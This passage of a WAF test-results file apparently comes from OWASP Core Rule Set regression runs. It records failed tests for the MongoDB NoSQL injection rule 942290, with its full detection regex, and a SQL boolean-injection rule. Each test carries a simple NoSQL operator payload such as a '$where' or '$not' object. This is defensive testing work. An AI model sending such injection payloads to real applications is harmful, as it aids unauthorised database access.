          "text" : "   crs-toolchain regex update 942130"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\s\\x0b\\\"'-\\)`]*?\\b([0-9A-Z_a-z]+)\\b[\\s\\x0b\\\"'-\\)`]*?(?:=|<=>|(?:sounds[\\s\\x0b]+)?like|glob|r(?:like|egexp))[\\s\\x0b\\\"'-\\)`]*?\\b([0-9A-Z_a-z]+)\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942130
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "replaceComments"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack: SQL Boolean-based attack detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.942130_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.942130_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "942290",
    "test_id" : 5,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942290.yaml",
    "description" : "basic MongoDB NOSQL injection attempts 4",
    "cause" : "failed expect_id check: 942290 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 5,
      "desc" : "basic MongoDB NOSQL injection attempts 4",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"$not\": \"foo\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942290 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942290,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942290.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942290"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)\\[?\\$(?:a(?:bs|c(?:cumulator|osh?)|dd(?:ToSet)?|ll(?:ElementsTrue)?|n(?:d|yElementTrue)|rray(?:ElemA|ToObjec)t|sinh?|tan[2h]?|vg)|b(?:etween|i(?:narySize|t(?:And|Not|(?:O|Xo)r)?)|ottomN?|sonSize|ucket(?:Auto)?)|c(?:eil|mp|o(?:n(?:cat(?:Arrays)?|d|vert)|sh?|unt|variance(?:Po|Sam)p)|urrentDate)|d(?:a(?:te(?:Add|Diff|From(?:Parts|String)|Subtract|T(?:o(?:Parts|String)|runc))|yOf(?:Month|Week|Year))|e(?:greesToRadians|nseRank|rivative)|iv(?:ide)?|ocumentNumber)|e(?:(?:a|lemMat)ch|q|x(?:ists|p(?:MovingAvg|r)?))|f(?:i(?:lter|rstN?)|loor|unction)|g(?:etField|roup|te?)|(?:hou|xo|yea)r|i(?:fNull|n(?:c|dexOf(?:Array|Bytes|CP)|tegral)?|s(?:Array|Number|o(?:DayOfWeek|Week(?:Year)?)))|jsonSchema|l(?:astN?|et|i(?:ke|(?:nearFil|tera)l)|n|o(?:cf|g(?:10)?)|t(?:e|rim)?)|m(?:a(?:p|xN?)|e(?:dian|rgeObjects|ta)|i(?:llisecond|n(?:N|ute)?)|o(?:d|nth)|ul(?:tiply)?)|n(?:atural|e|in|o[rt])|o(?:bjectToArray|r)|p(?:ercentile|o(?:[pw]|sition)|roject|u(?:ll(?:All)?|sh))|r(?:a(?:diansToDegrees|n(?:[dk]|ge))|e(?:(?:duc|nam)e|gex(?:Find(?:All)?|Match)?|place(?:All|One)|verseArray)|ound|trim)|s(?:(?:ampleRat|lic)e|e(?:cond|t(?:Difference|(?:Equal|WindowField)s|Field|I(?:ntersection|sSubset)|OnInsert|Union)?)|(?:hif|pli|qr)t|i(?:nh?|ze)|ort(?:Array)?|t(?:dDev(?:Po|Sam)p|r(?:Len(?:Bytes|CP)|casecmp))|u(?:b(?:str(?:Bytes|CP)?|tract)|m)|witch)|t(?:anh?|ext|o(?:Bool|D(?:(?:at|oubl)e|ecimal)|HashedIndexKey|Int|Lo(?:ng|wer)|ObjectId|String|U(?:UID|pper)|pN?)|r(?:im|unc)|s(?:Increment|Second)|ype)|unset|w(?:eek|here)|zip)\\]?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942290
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Finds basic MongoDB SQL injection attempts"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942290",
    "test_id" : 6,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942290.yaml",
    "description" : "basic MongoDB NOSQL injection attempts 5",
    "cause" : "failed expect_id check: 942290 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "basic MongoDB NOSQL injection attempts 5",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"$nor\": \"foo\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942290 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942290,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942290.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942290"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)\\[?\\$(?:a(?:bs|c(?:cumulator|osh?)|dd(?:ToSet)?|ll(?:ElementsTrue)?|n(?:d|yElementTrue)|rray(?:ElemA|ToObjec)t|sinh?|tan[2h]?|vg)|b(?:etween|i(?:narySize|t(?:And|Not|(?:O|Xo)r)?)|ottomN?|sonSize|ucket(?:Auto)?)|c(?:eil|mp|o(?:n(?:cat(?:Arrays)?|d|vert)|sh?|unt|variance(?:Po|Sam)p)|urrentDate)|d(?:a(?:te(?:Add|Diff|From(?:Parts|String)|Subtract|T(?:o(?:Parts|String)|runc))|yOf(?:Month|Week|Year))|e(?:greesToRadians|nseRank|rivative)|iv(?:ide)?|ocumentNumber)|e(?:(?:a|lemMat)ch|q|x(?:ists|p(?:MovingAvg|r)?))|f(?:i(?:lter|rstN?)|loor|unction)|g(?:etField|roup|te?)|(?:hou|xo|yea)r|i(?:fNull|n(?:c|dexOf(?:Array|Bytes|CP)|tegral)?|s(?:Array|Number|o(?:DayOfWeek|Week(?:Year)?)))|jsonSchema|l(?:astN?|et|i(?:ke|(?:nearFil|tera)l)|n|o(?:cf|g(?:10)?)|t(?:e|rim)?)|m(?:a(?:p|xN?)|e(?:dian|rgeObjects|ta)|i(?:llisecond|n(?:N|ute)?)|o(?:d|nth)|ul(?:tiply)?)|n(?:atural|e|in|o[rt])|o(?:bjectToArray|r)|p(?:ercentile|o(?:[pw]|sition)|roject|u(?:ll(?:All)?|sh))|r(?:a(?:diansToDegrees|n(?:[dk]|ge))|e(?:(?:duc|nam)e|gex(?:Find(?:All)?|Match)?|place(?:All|One)|verseArray)|ound|trim)|s(?:(?:ampleRat|lic)e|e(?:cond|t(?:Difference|(?:Equal|WindowField)s|Field|I(?:ntersection|sSubset)|OnInsert|Union)?)|(?:hif|pli|qr)t|i(?:nh?|ze)|ort(?:Array)?|t(?:dDev(?:Po|Sam)p|r(?:Len(?:Bytes|CP)|casecmp))|u(?:b(?:str(?:Bytes|CP)?|tract)|m)|witch)|t(?:anh?|ext|o(?:Bool|D(?:(?:at|oubl)e|ecimal)|HashedIndexKey|Int|Lo(?:ng|wer)|ObjectId|String|U(?:UID|pper)|pN?)|r(?:im|unc)|s(?:Increment|Second)|ype)|unset|w(?:eek|here)|zip)\\]?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942290
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Finds basic MongoDB SQL injection attempts"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942290",
    "test_id" : 7,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942290.yaml",
    "description" : "basic MongoDB NOSQL injection attempts 6",
    "cause" : "failed expect_id check: 942290 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "basic MongoDB NOSQL injection attempts 6",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"$where\": \"foo\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942290 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942290,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942290.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942290"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)\\[?\\$(?:a(?:bs|c(?:cumulator|osh?)|dd(?:ToSet)?|ll(?:ElementsTrue)?|n(?:d|yElementTrue)|rray(?:ElemA|ToObjec)t|sinh?|tan[2h]?|vg)|b(?:etween|i(?:narySize|t(?:And|Not|(?:O|Xo)r)?)|ottomN?|sonSize|ucket(?:Auto)?)|c(?:eil|mp|o(?:n(?:cat(?:Arrays)?|d|vert)|sh?|unt|variance(?:Po|Sam)p)|urrentDate)|d(?:a(?:te(?:Add|Diff|From(?:Parts|String)|Subtract|T(?:o(?:Parts|String)|runc))|yOf(?:Month|Week|Year))|e(?:greesToRadians|nseRank|rivative)|iv(?:ide)?|ocumentNumber)|e(?:(?:a|lemMat)ch|q|x(?:ists|p(?:MovingAvg|r)?))|f(?:i(?:lter|rstN?)|loor|unction)|g(?:etField|roup|te?)|(?:hou|xo|yea)r|i(?:fNull|n(?:c|dexOf(?:Array|Bytes|CP)|tegral)?|s(?:Array|Number|o(?:DayOfWeek|Week(?:Year)?)))|jsonSchema|l(?:astN?|et|i(?:ke|(?:nearFil|tera)l)|n|o(?:cf|g(?:10)?)|t(?:e|rim)?)|m(?:a(?:p|xN?)|e(?:dian|rgeObjects|ta)|i(?:llisecond|n(?:N|ute)?)|o(?:d|nth)|ul(?:tiply)?)|n(?:atural|e|in|o[rt])|o(?:bjectToArray|r)|p(?:ercentile|o(?:[pw]|sition)|roject|u(?:ll(?:All)?|sh))|r(?:a(?:diansToDegrees|n(?:[dk]|ge))|e(?:(?:duc|nam)e|gex(?:Find(?:All)?|Match)?|place(?:All|One)|verseArray)|ound|trim)|s(?:(?:ampleRat|lic)e|e(?:cond|t(?:Difference|(?:Equal|WindowField)s|Field|I(?:ntersection|sSubset)|OnInsert|Union)?)|(?:hif|pli|qr)t|i(?:nh?|ze)|ort(?:Array)?|t(?:dDev(?:Po|Sam)p|r(?:Len(?:Bytes|CP)|casecmp))|u(?:b(?:str(?:Bytes|CP)?|tract)|m)|witch)|t(?:anh?|ext|o(?:Bool|D(?:(?:at|oubl)e|ecimal)|HashedIndexKey|Int|Lo(?:ng|wer)|ObjectId|String|U(?:UID|pper)|pN?)|r(?:im|unc)|s(?:Increment|Second)|ype)|unset|w(?:eek|here)|zip)\\]?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942290
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Finds basic MongoDB SQL injection attempts"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942290",
    "test_id" : 8,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942290.yaml",
    "description" : "basic MongoDB NOSQL injection attempts 7",
    "cause" : "failed expect_id check: 942290 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 8,
      "desc" : "basic MongoDB NOSQL injection attempts 7",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"$elemMatch\": \"foo\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942290 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942290,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942290.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942290"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)\\[?\\$(?:a(?:bs|c(?:cumulator|osh?)|dd(?:ToSet)?|ll(?:ElementsTrue)?|n(?:d|yElementTrue)|rray(?:ElemA|ToObjec)t|sinh?|tan[2h]?|vg)|b(?:etween|i(?:narySize|t(?:And|Not|(?:O|Xo)r)?)|ottomN?|sonSize|ucket(?:Auto)?)|c(?:eil|mp|o(?:n(?:cat(?:Arrays)?|d|vert)|sh?|unt|variance(?:Po|Sam)p)|urrentDate)|d(?:a(?:te(?:Add|Diff|From(?:Parts|String)|Subtract|T(?:o(?:Parts|String)|runc))|yOf(?:Month|Week|Year))|e(?:greesToRadians|nseRank|rivative)|iv(?:ide)?|ocumentNumber)|e(?:(?:a|lemMat)ch|q|x(?:ists|p(?:MovingAvg|r)?))|f(?:i(?:lter|rstN?)|loor|unction)|g(?:etField|roup|te?)|(?:hou|xo|yea)r|i(?:fNull|n(?:c|dexOf(?:Array|Bytes|CP)|tegral)?|s(?:Array|Number|o(?:DayOfWeek|Week(?:Year)?)))|jsonSchema|l(?:astN?|et|i(?:ke|(?:nearFil|tera)l)|n|o(?:cf|g(?:10)?)|t(?:e|rim)?)|m(?:a(?:p|xN?)|e(?:dian|rgeObjects|ta)|i(?:llisecond|n(?:N|ute)?)|o(?:d|nth)|ul(?:tiply)?)|n(?:atural|e|in|o[rt])|o(?:bjectToArray|r)|p(?:ercentile|o(?:[pw]|sition)|roject|u(?:ll(?:All)?|sh))|r(?:a(?:diansToDegrees|n(?:[dk]|ge))|e(?:(?:duc|nam)e|gex(?:Find(?:All)?|Match)?|place(?:All|One)|verseArray)|ound|trim)|s(?:(?:ampleRat|lic)e|e(?:cond|t(?:Difference|(?:Equal|WindowField)s|Field|I(?:ntersection|sSubset)|OnInsert|Union)?)|(?:hif|pli|qr)t|i(?:nh?|ze)|ort(?:Array)?|t(?:dDev(?:Po|Sam)p|r(?:Len(?:Bytes|CP)|casecmp))|u(?:b(?:str(?:Bytes|CP)?|tract)|m)|witch)|t(?:anh?|ext|o(?:Bool|D(?:(?:at|oubl)e|ecimal)|HashedIndexKey|Int|Lo(?:ng|wer)|ObjectId|String|U(?:UID|pper)|pN?)|r(?:im|unc)|s(?:Increment|Second)|ype)|unset|w(?:eek|here)|zip)\\]?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942290
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Finds basic MongoDB SQL injection attempts"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942290",
    "test_id" : 9,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942290.yaml",
    "description" : "basic MongoDB NOSQL injection attempts 8",
    "cause" : "failed expect_id check: 942290 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "basic MongoDB NOSQL injection attempts 8",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"$text\": \"foo\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942290 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942290,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942290.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942290"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
